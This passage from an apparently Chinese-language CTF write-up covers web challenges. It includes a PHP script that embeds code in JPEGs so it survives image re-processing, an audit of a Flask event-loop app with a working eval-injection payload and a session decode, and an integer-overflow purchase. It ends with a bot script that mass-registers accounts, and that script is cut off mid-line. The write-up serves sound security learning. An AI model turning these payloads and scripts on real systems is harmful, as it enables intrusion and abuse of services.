&#125;</span><br><span class="line">    unlink(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>]);</span><br><span class="line">    die(<span class="string">'Something\'s wrong'</span>);</span><br><span class="line"></span><br><span class="line">    function checkImage($filename, $data, $unlink = FALSE) &#123;</span><br><span class="line">        <span class="keyword">global</span> $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage = TRUE;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        <span class="keyword">if</span>($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        <span class="keyword">return</span> $correctImage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;</span><br><span class="line">        <span class="keyword">global</span> $extraBytes, $correctImage;</span><br><span class="line">        $correctImage = FALSE;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(\d+) extraneous bytes before marker/'</span>, $errstr, $m)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(isset($m[<span class="number">1</span>])) &#123;</span><br><span class="line">                $extraBytes = (int)$m[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class DataInputStream &#123;</span><br><span class="line">        private $binData;</span><br><span class="line">        private $order;</span><br><span class="line">        private $size;</span><br><span class="line"></span><br><span class="line">        public function __construct($filename, $order = false, $fromString = false) &#123;</span><br><span class="line">            $this-&gt;binData = '';</span><br><span class="line">            $this-&gt;order = $order;</span><br><span class="line">            <span class="keyword">if</span>(!$fromString) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    die(<span class="string">'File not exists ['</span>.$filename.<span class="string">']'</span>);</span><br><span class="line">                $this-&gt;binData = file_get_contents($filename);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $this-&gt;binData = $filename;</span><br><span class="line">            &#125;</span><br><span class="line">            $this-&gt;size = strlen($this-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function seek() &#123;</span><br><span class="line">            return ($this-&gt;size - strlen($this-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function skip($skip) &#123;</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, $skip);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function readByte() &#123;</span><br><span class="line">            if($this-&gt;eof()) &#123;</span><br><span class="line">                die(<span class="string">'End Of File'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $byte = substr($this-&gt;binData, 0, 1);</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, 1);</span><br><span class="line">            <span class="keyword">return</span> ord($byte);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function readShort() &#123;</span><br><span class="line">            if(strlen($this-&gt;binData) &lt; 2) &#123;</span><br><span class="line">                die(<span class="string">'End Of File'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $short = substr($this-&gt;binData, 0, 2);</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, 2);</span><br><span class="line">            if($this-&gt;order) &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $short;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function eof() &#123;</span><br><span class="line">            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>用生成的图片上传，然后下载下来检查语句是否写入成功</p><p><img src="https://i.loli.net/2019/07/09/5d24758d1c86157114.png" alt="5.png"></p><p><strong><em>写入成功~</em></strong></p><h2 id="homebrew-event-loop"><a href="#homebrew-event-loop" class="headerlink" title="homebrew event loop"></a>homebrew event loop</h2><p>打开后是四个超链接和一个提示：<code>[INFO] you have 0 diamonds, 3 points now.</code>，大致功能就是可以查看源码，然后用积分买钻石。</p><p><img src="https://i.loli.net/2019/07/10/5d2605232983656770.png" alt="展示界面"></p><p>每个链接都试了一下，没什么特别的，直接审计源码</p><h3 id="审计源码-1"><a href="#审计源码-1" class="headerlink" title="审计源码"></a>审计源码</h3><p>server.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># written in python 2.7</span></span><br><span class="line">__author__ = <span class="string">'garzon'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, Response</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">'*********************'</span> <span class="comment"># censored</span></span><br><span class="line">url_prefix = <span class="string">'/d5af31f86147e857'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行该函数会输出flag</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'FLAG_is_here_but_i_wont_show_you'</span>  <span class="comment"># censored</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将传入的参数存入队列中，固定保留后5个</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span><span class="params">(event)</span>:</span></span><br><span class="line">session[<span class="string">'log'</span>].append(event)</span><br><span class="line"><span class="keyword">if</span> len(session[<span class="string">'log'</span>]) &gt; <span class="number">5</span>: session[<span class="string">'log'</span>] = session[<span class="string">'log'</span>][<span class="number">-5</span>:]</span><br><span class="line"><span class="keyword">if</span> type(event) == type([]):</span><br><span class="line">request.event_queue += event</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">request.event_queue.append(event)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回 prefix 与 postfix 中间的字符串(postfix != None)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span><span class="params">(haystack, prefix, postfix=None)</span>:</span></span><br><span class="line">haystack = haystack[haystack.find(prefix)+len(prefix):]</span><br><span class="line"><span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">haystack = haystack[:haystack.find(postfix)]</span><br><span class="line"><span class="keyword">return</span> haystack</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环执行 trigger_event()传入队列的数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span><span class="params">()</span>:</span></span><br><span class="line">valid_event_chars = set(<span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span>)</span><br><span class="line">    <span class="comment"># 设置输入字符白名单</span></span><br><span class="line">resp = <span class="literal">None</span></span><br><span class="line"><span class="keyword">while</span> len(request.event_queue) &gt; <span class="number">0</span>:</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 队列向后推进一个队列成员的方法</span></span><br><span class="line">event = request.event_queue[<span class="number">0</span>] <span class="comment"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span></span><br><span class="line">request.event_queue = request.event_queue[<span class="number">1</span>:]</span><br><span class="line">        </span><br><span class="line">       <span class="comment"># 必须以'action'/'func'开头</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">'action:'</span>, <span class="string">'func:'</span>)): <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> event:</span><br><span class="line"><span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars: <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">is_action = event[<span class="number">0</span>] == <span class="string">'a'</span></span><br><span class="line">action = get_mid_str(event, <span class="string">':'</span>, <span class="string">';'</span>)  <span class="comment"># 获取需要执行的函数名</span></span><br><span class="line">args = get_mid_str(event, action+<span class="string">';'</span>).split(<span class="string">'#'</span>)  <span class="comment"># 获取参数</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># 关键代码：函数执行</span></span><br><span class="line">event_handler = eval(action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>))</span><br><span class="line">ret_val = event_handler(args)</span><br><span class="line"><span class="keyword">except</span> RollBackException:</span><br><span class="line"><span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = <span class="string">''</span></span><br><span class="line">resp += <span class="string">'ERROR! All transactions have been cancelled. &lt;br /&gt;'</span></span><br><span class="line">resp += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">session[<span class="string">'num_items'</span>] = request.prev_session[<span class="string">'num_items'</span>]</span><br><span class="line">session[<span class="string">'points'</span>] = request.prev_session[<span class="string">'points'</span>]</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span> Exception, e:</span><br><span class="line"><span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = <span class="string">''</span></span><br><span class="line"><span class="comment"># resp += str(e) # only for debugging</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = ret_val</span><br><span class="line"><span class="keyword">else</span>: resp += ret_val</span><br><span class="line"><span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">''</span>: resp = (<span class="string">'404 NOT FOUND'</span>, <span class="number">404</span>)</span><br><span class="line">session.modified = <span class="literal">True</span></span><br><span class="line"><span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 只有唯一一个路由，为程序入口</span></span><br><span class="line"><span class="meta">@app.route(url_prefix+'/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span><span class="params">()</span>:</span></span><br><span class="line">querystring = urllib.unquote(request.query_string)</span><br><span class="line">request.event_queue = []</span><br><span class="line"><span class="keyword">if</span> querystring == <span class="string">''</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">'action:'</span>)) <span class="keyword">or</span> len(querystring) &gt; <span class="number">100</span>:</span><br><span class="line">querystring = <span class="string">'action:index;False#False'</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'num_items'</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">session[<span class="string">'num_items'</span>] = <span class="number">0</span></span><br><span class="line">session[<span class="string">'points'</span>] = <span class="number">3</span></span><br><span class="line">session[<span class="string">'log'</span>] = []</span><br><span class="line">request.prev_session = dict(session)</span><br><span class="line">trigger_event(querystring)</span><br><span class="line"><span class="keyword">return</span> execute_event_loop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># handlers/functions below --------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">page = args[<span class="number">0</span>]</span><br><span class="line">html = <span class="string">''</span></span><br><span class="line">html += <span class="string">'[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;'</span>.format(session[<span class="string">'num_items'</span>], session[<span class="string">'points'</span>])</span><br><span class="line"><span class="keyword">if</span> page == <span class="string">'index'</span>:</span><br><span class="line">html += <span class="string">'&lt;a href="./?action:index;True%23False"&gt;View source code&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">html += <span class="string">'&lt;a href="./?action:view;shop"&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">html += <span class="string">'&lt;a href="./?action:view;reset"&gt;Reset&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line"><span class="keyword">elif</span> page == <span class="string">'shop'</span>:</span><br><span class="line">html += <span class="string">'&lt;a href="./?action:buy;1"&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line"><span class="keyword">elif</span> page == <span class="string">'reset'</span>:</span><br><span class="line"><span class="keyword">del</span> session[<span class="string">'num_items'</span>]</span><br><span class="line">html += <span class="string">'Session reset.&lt;br /&gt;'</span></span><br><span class="line">html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line"><span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">bool_show_source = str(args[<span class="number">0</span>])</span><br><span class="line">bool_download_source = str(args[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> bool_show_source == <span class="string">'True'</span>:</span><br><span class="line"></span><br><span class="line">source = open(<span class="string">'eventLoop.py'</span>, <span class="string">'r'</span>)</span><br><span class="line">html = <span class="string">''</span></span><br><span class="line"><span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>:</span><br><span class="line">html += <span class="string">'&lt;a href="./?action:index;True%23True"&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> source:</span><br><span class="line"><span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>:</span><br><span class="line">html += line.replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;amp;'</span>).replace(<span class="string">'\t'</span>, <span class="string">'&amp;nbsp;'</span>*<span class="number">4</span>).replace(<span class="string">' '</span>,<span class="string">'&amp;nbsp;'</span>).replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>).replace(<span class="string">'\n'</span>, <span class="string">'&lt;br /&gt;'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">html += line</span><br><span class="line">source.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> bool_download_source == <span class="string">'True'</span>:</span><br><span class="line">headers = &#123;&#125;</span><br><span class="line">headers[<span class="string">'Content-Type'</span>] = <span class="string">'text/plain'</span></span><br><span class="line">headers[<span class="string">'Content-Disposition'</span>] = <span class="string">'attachment; filename=serve.py'</span></span><br><span class="line"><span class="keyword">return</span> Response(html, headers=headers)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> html</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">trigger_event(<span class="string">'action:view;index'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 增加diamonds数量</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">num_items = int(args[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">if</span> num_items &lt;= <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'</span>.format(args[<span class="number">0</span>])</span><br><span class="line">session[<span class="string">'num_items'</span>] += num_items</span><br><span class="line">    <span class="comment"># 注意这里会调用下面的函数，直接增加diamonds会导致下面的函数抛出异常</span></span><br><span class="line">trigger_event([<span class="string">'func:consume_point;&#123;&#125;'</span>.format(num_items), <span class="string">'action:view;index'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 消耗points数量</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span><span class="params">(args)</span>:</span></span><br><span class="line">point_to_consume = int(args[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">if</span> session[<span class="string">'points'</span>] &lt; point_to_consume: <span class="keyword">raise</span> RollBackException()</span><br><span class="line">session[<span class="string">'points'</span>] -= point_to_consume</span><br><span class="line"></span><br><span class="line"><span class="comment"># 没用的显示flag函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span><span class="params">(args)</span>:</span></span><br><span class="line">flag = args[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'You naughty boy! ;) &lt;br /&gt;'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当diamonds &gt; 5 时将flag存入队列中</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span><span class="params">(args)</span>:</span></span><br><span class="line"><span class="keyword">if</span> session[<span class="string">'num_items'</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">trigger_event(<span class="string">'func:show_flag;'</span> + FLAG()) <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">trigger_event(<span class="string">'action:view;index'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">app.run(debug=<span class="literal">False</span>, host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure><p><strong>上面的代码最好自行审计一遍。</strong></p><h3 id="关键逻辑"><a href="#关键逻辑" class="headerlink" title="关键逻辑"></a>关键逻辑</h3><p>通过适当构造传参我们可以实现函数执行。</p><p>注意这里限制了函数名，可以通过<code>#</code>来注释掉后面的后缀。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关键代码：函数执行</span></span><br><span class="line">event_handler = eval(action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>))</span><br><span class="line">ret_val = event_handler(args)</span><br></pre></td></tr></table></figure><p>由于有get_flag_handler()函数，可以考虑是否能让<code>num_items &gt; 5</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 增加diamonds数量</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">num_items = int(args[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">if</span> num_items &lt;= <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'</span>.format(args[<span class="number">0</span>])</span><br><span class="line">session[<span class="string">'num_items'</span>] += num_items</span><br><span class="line">    <span class="comment"># 注意这里会调用下面的函数，直接增加diamonds会导致下面的函数抛出异常</span></span><br><span class="line">trigger_event([<span class="string">'func:consume_point;&#123;&#125;'</span>.format(num_items), <span class="string">'action:view;index'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 消耗points数量</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span><span class="params">(args)</span>:</span></span><br><span class="line">point_to_consume = int(args[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">if</span> session[<span class="string">'points'</span>] &lt; point_to_consume: <span class="keyword">raise</span> RollBackException()</span><br><span class="line">session[<span class="string">'points'</span>] -= point_to_consume</span><br></pre></td></tr></table></figure><p>注意到我们可以执行程序中的任何一个带参函数，所以也包括添加队列的<code>trigger_event()</code>，<strong>这里一种思路就是增加两个假队列成员，分别执行buy、get_flag两个函数，在consume_point抛出错误之前输出flag</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将传入的参数存入队列中，固定保留后5个</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span><span class="params">(event)</span>:</span></span><br><span class="line">session[<span class="string">'log'</span>].append(event)</span><br><span class="line"><span class="keyword">if</span> len(session[<span class="string">'log'</span>]) &gt; <span class="number">5</span>: session[<span class="string">'log'</span>] = session[<span class="string">'log'</span>][<span class="number">-5</span>:]</span><br><span class="line"><span class="keyword">if</span> type(event) == type([]):</span><br><span class="line">request.event_queue += event</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">request.event_queue.append(event)</span><br></pre></td></tr></table></figure><p>Payload：<code>?action:trigger_event%23;action:buy;10%23action:get_flag;</code></p><p>然后抓包解密session即可。</p><p><img src="https://i.loli.net/2019/07/11/5d260fe1ace2c70074.png" alt="session效果图"></p><h3 id="Flask-cookie-session"><a href="#Flask-cookie-session" class="headerlink" title="Flask cookie-session"></a>Flask cookie-session</h3><p>Flask框架下，session是储存在客户端的，虽然使用签名处理过防止被篡改，但是却没有对session进行加密操作，这导致敏感信息泄露。</p><p>前面通过Payload打一发，得到了含有flag的session，这里使用<strong>@离别歌</strong>大佬的脚本解密得到flag。</p><p><img src="https://i.loli.net/2019/07/11/5d261087158a983187.png" alt="flag效果图"></p><h2 id="大吉大利，今晚吃鸡"><a href="#大吉大利，今晚吃鸡" class="headerlink" title="大吉大利，今晚吃鸡"></a>大吉大利，今晚吃鸡</h2><p>登录注册，账户里只有100金币，要2000金币买ticket (怎么没有充值入口</p><h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><p>截取添加订单的请求包，发现ticket_price字段，且ticket_price是可控的：</p><p><img src="https://i.loli.net/2019/07/11/5d26155c0202658527.png" alt="ticket_price"></p><p>经过尝试后发现只能是大于2000的整数，那么考虑整数溢出。</p><p>32位操作系统的最大整数为4294967295，确保万无一失我们改为4294967296，购买成功。</p><p><img src="https://i.loli.net/2019/07/11/5d2616954110f60879.png" alt="购买成功"></p><h3 id="脚本踢人"><a href="#脚本踢人" class="headerlink" title="脚本踢人"></a>脚本踢人</h3><p>直接上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">regist = <span class="string">"http://117.51.147.155:5050/ctf/api/register?password=11111111&amp;name=vvvvwwwcvv"</span><span class="comment">#name添加一个前缀</span></span><br><span class="line">buy_ticket = <span class="string">"http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296"</span></span><br><span class="line">pay_ticket = <span class="string">"http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id="</span></span><br><span class="line">delete = <span class="string">"http://117.51.147.155:5050/ctf/api/remove_robot"</span></span><br><span class="line">get_flag=<span class="string">"http://117.51.147.155:5050/ctf/api/get_flag"</span></span><br><span class="line"></span><br><span class="line">i= <span class="number">999883</span>                                                       <span class="comment">#初始化用户名,使用未注册过的数字</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_robot</span><span class="params">(player_id, player_ticket)</span>:</span></span><br><span class="line">    COOKIE = &#123;<span class="string">"Cookie"</span>: <span class="string">"user_name= fsdaaaaaaaaaaaa; REVEL_SESSION=ca8bd90e72a2844c1f1db795f1d92a88"</span>&#125;               <span class="comment">#修改为自己主账户的cookie</span></span><br><span class="line">    param=&#123;<span class="string">"id"</span>:player_id,<span class="string">"ticket"</span>:player_ticket&#125;</span><br><span class="line">    requests.get(delete,params=param, headers=COOKIE)               <span class="comment">#删除id</span></span><br><span class="line">    flag = requests.get(get_flag, headers=COOKIE)                   <span class="comment">#获取剩余的敌人数量</span></span><br><span class="line">    print(flag.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    t = requests.session()</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    r = t.get(regist + str(i))                      <span class="comment">#注册</span></span><br><span class="line">    r = t.get(buy_ticket).json()                    <span class="comment">#购买Ticket，解析json</span></span><br><span class="line">    bill_id = r[<span class="string">"data"</span>][<span class="number">0</span>][<span class="string">"bill_id"</span>]               <span class="comment">#json解析bill_id</span></span><br><span class="line">    r = t.get(pay_ticket + bill_id).json()          <span class="comment">#支付订单</span></span><br><span class="line">    player_id = r[<span 